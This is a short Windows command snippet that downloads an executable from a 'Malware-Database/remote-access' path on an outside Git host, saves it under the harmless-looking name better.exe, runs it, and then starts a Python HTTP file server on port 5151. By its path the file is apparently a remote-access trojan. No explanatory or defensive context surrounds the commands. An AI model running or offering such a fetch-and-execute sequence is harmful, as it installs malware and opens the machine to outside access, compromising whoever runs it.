curl https://gitea.com/cvmuser1000/Malware-Database/raw/branch/main/remote-access/skyhighsundaerat.exe --output better.exe
start better.exe
py -m http.server 5151
